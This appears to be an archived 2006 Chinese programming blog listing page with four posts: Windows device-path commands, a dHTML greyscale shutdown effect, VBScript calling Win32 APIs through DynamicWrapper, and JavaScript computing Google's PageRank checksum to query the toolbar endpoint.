+C:\&gt;dir \\?\Volume{d1dd98a0-85e1-11db-9bf6-806d6172696f}\Windows<br/>
+就相当于<br/>
+dir %WinDir% 了。</p>
+<p>输入<br/>
+type \\?\GLOBALROOT\Device\HardDiskVolume1\boot.ini<br/>
+就相当于<br/>
+type C:\Boot.ini</p>
+<p>看来Windows 也有一个类似于 ext3 的文件系统啊。加上 Windows Shell Namespace，应该比 ext3 丰富了吧。</p>
+<p>粗略的估计，用命令行可以查看一些Win32的 NamedPipe 和 内存、TCP 连接的情况。由于本人才疏学浅，不知道从哪里入手，不过总体感觉是：Windows&nbsp; 到底还是MS几亿美金打造的OS，还是有其深刻内涵的。从这点看来，Linux又显得原始了点。</p>
+<p>[内有附件]</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2006-12-22T05:50:00+08:00">2006-12-22</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/cnblogs/600413"  rel="bookmark" >
+              <h2 class="card-title">[原创]XP关机对话框的变灰dHTML特效</h2>
+            </a>
+            <p class="card-text"><p>&lt;!-- This element has the filter applied. --&gt;<br/>
+<br/>
+&lt;DIV ID=&quot;oTrans&quot; STYLE=&quot;position:absolute; top:0px; left:0px; width:100%; height:100%;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; background-image=url(file:///C:/WINDOWS/Web/Wallpaper/Bliss.bmp);<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; filter:progid:DXImageTransform.Microsoft.Fade(duration=2);&quot;&gt;<br/>
+&lt;BUTTON onclick=&quot;fnToggle()&quot;&gt;Logout&lt;/BUTTON&gt;<br/>
+<br/>
+&lt;DIV ID=&quot;oTrans1&quot; STYLE=&quot;position:absolute; top:0px; left:0px; width:100%; height:100%; visibility:hidden;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; background-image=url(file:///C:/WINDOWS/Web/Wallpaper/Bliss.bmp);<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1);&quot;&gt;<br/>
+&lt;BUTTON onclick=&quot;fnToggle()&quot;&gt;Cancel&lt;/BUTTON&gt;<br/>
+&lt;/DIV&gt;<br/>
+<br/>
+&lt;/DIV&gt;<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+&lt;SCRIPT&gt;<br/>
+var bTranState = 0;<br/>
+<br/>
+<br/>
+function fnToggle()<br/>
+{<br/>
+&nbsp; &nbsp; oTrans.filters[0].Apply();<br/>
+&nbsp; &nbsp; <br/>
+&nbsp; &nbsp; if (bTranState==0)<br/>
+&nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; bTranState = 1;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oTrans1.style.visibility=&quot;visible&quot;;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+&nbsp; &nbsp; else<br/>
+&nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oTrans.filters[0].stop();<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; bTranState = 0;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oTrans1.style.visibility=&quot;hidden&quot;;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
+<br/>
+&nbsp; &nbsp; oTrans.filters[0].Play();<br/>
+}<br/>
+<br/>
+&lt;/SCRIPT&gt;<br/>
+</p>
+<p>&nbsp;</p>
+<p>初次写 js 特效，有点不精简，呵呵。</p>
+<p>最开始是做一个 div ，直接用 fade 和 baseimage 两个虑境，但是由于某些原因，fade虑境被省略了，于是做两个 img 呵呵。</p>
+<p>我最开始是发布在51js上的，搜索了下，网上已经有人乱转代码了。国内软件行业就这种抄过去抄过来的混乱。</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2006-12-22T05:50:00+08:00">2006-12-22</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/cnblogs/600411"  rel="bookmark" >
+              <h2 class="card-title">vbs 调用 Win32 API</h2>
+            </a>
+            <p class="card-text"><p>Option Explicit<br/>
+Dim UserWrap <br/>
+Set UserWrap = CreateObject(&quot;DynamicWrapper&quot;)</p>
+<p>' Call MessageBoxA(), first register the API function<br/>
+UserWrap.Register &quot;USER32.DLL&quot;, &quot;MessageBoxA&quot;, &quot;I=HsSu&quot;, _<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot;f=s&quot;, &quot;R=l&quot;<br/>
+' now call the function<br/>
+UserWrap.MessageBoxA Null, &quot;MessageBox (ANSI)&quot;, _<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &quot;From DynaWrap Object&quot;, 3</p>
+<p>&nbsp;Readme.txt</p>
+<p>This is the dynacall.dll that I described as &quot;bringing back the Declare<br/>
+statement&quot;&nbsp; in VBScript. Basically it will allow you to call functions<br/>
+in other dlls...like any of the win32 api functions. This will be my<br/>
+only distribution.</p>
+<p>Many thanks to Ton Plooy and Jeff Stong who wrote the code and published<br/>
+it in WDJ. And more thanks to William Epp for getting it to work with my<br/>
+sample script ccupd.vbs using the GETPROFILESTRING function. However I<br/>
+have another function in the sample that still doesn't work<br/>
+GETPROFILESECTION. This is a work in progress but I think it is a handy<br/>
+little feature. Hopefully by this distributions it will get where it<br/>
+needs to be. Clarence and Ian have offered to post it on their sites so<br/>
+further updates can be had at either WSH site. (anyone else call this<br/>
+thing woosh? Hopefully it will perform this way).</p>
+<p>Basically you declare functions and other DLLS like this:</p>
+<p>'&nbsp;&nbsp; Create the wrapper object for dynamic DLL function calling<br/>
+Dim UserWrap <br/>
+Set UserWrap = CreateObject(&quot;DynamicWrapper&quot;)<br/>
+'&nbsp;&nbsp; GetProcAddress for GetPrivateProfileStringA()<br/>
+UserWrap.Register &quot;kernel32.DLL&quot;, &quot;GetPrivateProfileString&quot;, &quot;i=ssssls&quot;,<br/>
+&quot;f=s&quot;, &quot;r=l&quot;</p>
+<p><br/>
+The input parameters are:</p>
+<p>i=describes the number and data type of the functions parameters</p>
+<p>f=type of call _stdcall or _cdecl. So it can work with both MS C++ and<br/>
+Borland C++. Default to _stdcall. If that doesn't work use _cdecl. If<br/>
+that doesn't work good luck!</p>
+<p>r=return data type.</p>
+<p><br/>
+Data types are:</p>
+<p>const ARGTYPEINFO ArgInfo[] = <br/>
+{<br/>
+{'a', sizeof(IDispatch*),&nbsp;&nbsp;&nbsp; VT_DISPATCH}, // a&nbsp;&nbsp; IDispatch*<br/>
+{'c', sizeof(unsigned char), VT_I4},&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // c&nbsp;&nbsp; signed char&nbsp; <br/>
+{'d', sizeof(double),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VT_R8},&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // d&nbsp;&nbsp; 8 byte real <br/>
+{'f', sizeof(float),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VT_R4},&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // f&nbsp;&nbsp; 4 byte real <br/>
+{'k', sizeof(IUnknown*),&nbsp;&nbsp;&nbsp;&nbsp; VT_UNKNOWN},&nbsp; // k&nbsp;&nbsp; IUnknown* <br/>
+{'h', sizeof(long),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VT_I4},&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // h&nbsp;&nbsp; HANDLE <br/>
+{'l', sizeof(long),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VT_I4},&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // l&nbsp;&nbsp; long <br/>
+{'p', sizeof(void*),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VT_PTR},&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // p&nbsp;&nbsp; pointer <br/>
+{'s', sizeof(BSTR),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VT_LPSTR},&nbsp;&nbsp;&nbsp; // s&nbsp;&nbsp; string <br/>
+{'t', sizeof(short),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VT_I2},&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // t&nbsp;&nbsp; short <br/>
+{'u', sizeof(UINT),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VT_UINT},&nbsp;&nbsp;&nbsp;&nbsp; // u&nbsp;&nbsp; unsigned int <br/>
+{'w', sizeof(BSTR),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VT_LPWSTR},&nbsp;&nbsp; // w&nbsp;&nbsp; wide string <br/>
+}</p>
+<p>William Epp added anr 'r' for VT_BYREF (pass by reference)but is for<br/>
+strings only. This made the GETPROFILESTRING function to work. But it<br/>
+didn't work for the GETPROFILESECTION. If anyone gets it to work please<br/>
+let me know.</p>
+<p><br/>
+Attachments:</p>
+<p>stong.zip - original download from WDJ<br/>
+DynaWrap.zip - the modified code, the DLL with modifications.<br/>
+feature.htm - the feature article for this code by Jeff Stong. Only<br/>
+thing I could find on WDJ. I couldn't find Ton's article.</p>
+<p><a href="http://cwashington.netreach.net/site/downloads.html">http://cwashington.netreach.net/site/downloads.html</a></p>
+<p><a href="http://www.mvps.org/scripting/">http://www.mvps.org/scripting/</a></p>
+<p>[内有附件]</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2006-12-22T05:50:00+08:00">2006-12-22</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/cnblogs/600409"  rel="bookmark" >
+              <h2 class="card-title">[原]JavaScript 获得 Google PageRank</h2>
+            </a>
+            <p class="card-text"><p>&lt;script&gt;<br/>
+</p>
+<p>alert(GetPageRank(&quot;<a href="http://www.dormforce.net">http://www.dormforce.net</a>&quot;));</p>
+<p>function GetPageRank(strUrl)<br/>
+{<br/>
+&nbsp;sURL=&quot;<a href="http://toolbarqueries.google.com/search?client=navclient-auto&amp;ch">http://toolbarqueries.google.com/search?client=navclient-auto&amp;ch</a>=&quot; + GetPR(strUrl) + &quot;&amp;ie=UTF-8&amp;oe=UTF-8&amp;features=Rank&amp;q=info:&quot; + encodeURIComponent(strUrl);<br/>
+&nbsp;var xmlHttp = new ActiveXObject(&quot;msxml2.xmlhttp&quot;)<br/>
+&nbsp;xmlHttp.open(&quot;GET&quot;,sURL,0);<br/>
+&nbsp;xmlHttp.setRequestHeader(&quot;User-Agent&quot;,&quot;Mozilla\/4.0 (compatible; GoogleToolbar 2.0.110.4-big; Windows 2000 5.0)&quot;);<br/>
+&nbsp;xmlHttp.send();<br/>
+&nbsp;return(xmlHttp.responseText);<br/>
+}</p>
+<p>function GetPR(url) <br/>
+{<br/>
+&nbsp;url =&quot;info:&quot; + url;<br/>
+&nbsp;ch = GoogleCH(str_asc(url)); <br/>
+&nbsp;ch = &quot;6&quot; + ch<br/>
+&nbsp;return ch;<br/>
+}</p>
+<p>function str_asc(string)<br/>
+{<br/>
+&nbsp;result = new Array();<br/>
+&nbsp;lin = string.length;<br/>
+&nbsp;for(i=0;i&lt;lin;i++)<br/>
+&nbsp;{<br/>
+&nbsp;&nbsp;result[i] = string.substring(i).charCodeAt(0);<br/>
+&nbsp;}<br/>
+&nbsp;return result;<br/>
+}</p>
+<p>function yiweitwo(a, b)<br/>
+{<br/>
+&nbsp;z = 0x80000000; <br/>
+&nbsp;<br/>
+&nbsp;if (z &amp; a)<br/>
+&nbsp;{<br/>
+&nbsp;&nbsp;a = (a&gt;&gt;1);<br/>
+&nbsp;&nbsp;a &amp;= (~z);<br/>
+&nbsp;&nbsp;a |= 0x40000000;<br/>
+&nbsp;&nbsp;a = (a&gt;&gt;(b-1));<br/>
+&nbsp;}<br/>
+&nbsp;else<br/>
+&nbsp;{<br/>
+&nbsp;&nbsp;a = (a&gt;&gt;b);<br/>
+&nbsp;}<br/>
+&nbsp;return a;<br/>
+}</p>
+<p>function yiwei(a,b,c) <br/>
+{<br/>
+&nbsp;a -= b; a -= c; a ^= (yiweitwo(c,13));<br/>
+&nbsp;b -= c; b -= a; b ^= (a&lt;&lt;8);<br/>
+&nbsp;c -= a; c -= b; c ^= (yiweitwo(b,13));<br/>
+&nbsp;a -= b; a -= c; a ^= (yiweitwo(c,12));<br/>
+&nbsp;b -= c; b -= a; b ^= (a&lt;&lt;16);<br/>
+&nbsp;c -= a; c -= b; c ^= (yiweitwo(b,5));<br/>
+&nbsp;a -= b; a -= c; a ^= (yiweitwo(c,3)); <br/>
+&nbsp;b -= c; b -= a; b ^= (a&lt;&lt;10);<br/>
+&nbsp;c -= a; c -= b; c ^= (yiweitwo(b,15));<br/>
+&nbsp;<br/>
+&nbsp;var myarray = new Array (a,b,c);<br/>
+&nbsp;<br/>
+&nbsp;return myarray;<br/>
+}</p>
+<p>function GoogleCH(url) <br/>
+{<br/>
+&nbsp;length = url.length;<br/>
+&nbsp;<br/>
+&nbsp;a = b = 0x9E3779B9;<br/>
+&nbsp;c = 0xE6359A60;<br/>
+&nbsp;k = 0;<br/>
+&nbsp;len = length;<br/>
+&nbsp;while(len &gt;= 12) <br/>
+&nbsp;{<br/>
+&nbsp;&nbsp;a += (url[k+0] +(url[k+1]&lt;&lt;8) +(url[k+2]&lt;&lt;16) +(url[k+3]&lt;&lt;24));<br/>
+&nbsp;&nbsp;b += (url[k+4] +(url[k+5]&lt;&lt;8) +(url[k+6]&lt;&lt;16) +(url[k+7]&lt;&lt;24));<br/>
+&nbsp;&nbsp;c += (url[k+8] +(url[k+9]&lt;&lt;8) +(url[k+10]&lt;&lt;16)+(url[k+11]&lt;&lt;24));<br/>
+&nbsp;&nbsp;mid = yiwei(a,b,c);<br/>
+&nbsp;&nbsp;a = mid[0]; b = mid[1]; c = mid[2];<br/>
+&nbsp;&nbsp;k += 12;<br/>
+&nbsp;&nbsp;len -= 12;<br/>
+&nbsp;}<br/>
+&nbsp;<br/>
+&nbsp;c += length;<br/>
+&nbsp;switch(len)<br/>
+&nbsp;{<br/>
+&nbsp;&nbsp;case 11: <br/>
+&nbsp;&nbsp;&nbsp;&nbsp; {<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c+=(url[k+10]&lt;&lt;24);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c+=(url[k+9]&lt;&lt;16);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c+=(url[k+8]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+7]&lt;&lt;24);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+6]&lt;&lt;16);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+5]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+4]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+3]&lt;&lt;24);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+2]&lt;&lt;16);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+1]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+0]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br/>
+&nbsp;&nbsp;}<br/>
+&nbsp;&nbsp;case 10:<br/>
+&nbsp;&nbsp;&nbsp; {<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c+=(url[k+9]&lt;&lt;16);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c+=(url[k+8]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+7]&lt;&lt;24);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+6]&lt;&lt;16);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+5]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+4]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+3]&lt;&lt;24);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+2]&lt;&lt;16);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+1]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+0]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br/>
+&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; <br/>
+&nbsp;&nbsp;case 9 :<br/>
+&nbsp;&nbsp;{<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; c+=(url[k+8]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+7]&lt;&lt;24);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+6]&lt;&lt;16);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+5]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+4]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+3]&lt;&lt;24);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+2]&lt;&lt;16);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+1]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+0]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br/>
+&nbsp;&nbsp;&nbsp;&nbsp; }<br/>
+&nbsp;&nbsp;case 8 : <br/>
+&nbsp;&nbsp;&nbsp;&nbsp; {<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+7]&lt;&lt;24);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+6]&lt;&lt;16);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+5]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+4]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+3]&lt;&lt;24);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+2]&lt;&lt;16);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+1]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+0]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br/>
+&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; <br/>
+&nbsp;&nbsp;case 7 : <br/>
+&nbsp;&nbsp;&nbsp;&nbsp; {<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+6]&lt;&lt;16);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+5]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+4]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+3]&lt;&lt;24);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+2]&lt;&lt;16);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+1]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+0]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br/>
+&nbsp;&nbsp;&nbsp;&nbsp; }<br/>
+&nbsp;&nbsp;case 6 :<br/>
+&nbsp;&nbsp;&nbsp;&nbsp; {<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+5]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+4]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+3]&lt;&lt;24);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+2]&lt;&lt;16);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+1]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+0]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br/>
+&nbsp;&nbsp;&nbsp;&nbsp; }<br/>
+&nbsp;&nbsp;case 5 : <br/>
+&nbsp;&nbsp;&nbsp;&nbsp; {<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; b+=(url[k+4]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+3]&lt;&lt;24);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+2]&lt;&lt;16);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+1]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+0]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br/>
+&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; <br/>
+&nbsp;&nbsp;case 4 : <br/>
+&nbsp;&nbsp;&nbsp;&nbsp; {<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+3]&lt;&lt;24);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+2]&lt;&lt;16);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+1]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+0]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br/>
+&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; <br/>
+&nbsp;&nbsp;case 3 :<br/>
+&nbsp;&nbsp;&nbsp;&nbsp; {<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+2]&lt;&lt;16);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+1]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+0]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br/>
+&nbsp;&nbsp;&nbsp;&nbsp; }<br/>
+&nbsp;&nbsp;case 2 :<br/>
+&nbsp;&nbsp;&nbsp;&nbsp; {<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+1]&lt;&lt;8);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+0]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br/>
+&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; <br/>
+&nbsp;&nbsp;case 1 :<br/>
+&nbsp;&nbsp;&nbsp;&nbsp; {<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a+=(url[k+0]);<br/>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br/>
+&nbsp;&nbsp;&nbsp;&nbsp; }<br/>
+&nbsp;}<br/>
+&nbsp;mid = yiwei(a,b,c);<br/>
+&nbsp;return mid[2];<br/>
+}<br/>
+&lt;/script&gt;</p>
+<p>其中ch效俭算法是参考网上ASP版的。</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2006-12-22T05:50:00+08:00">2006-12-22</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+    </main>
+    <nav class="pagination-nav side-padding">
+<a href="/index.67.html" class="pagination-newer">&lt; Newer Posts</a>    </nav>
+
+<script src="/theme/js/core.js"></script>
+
+  </body>
+</html>
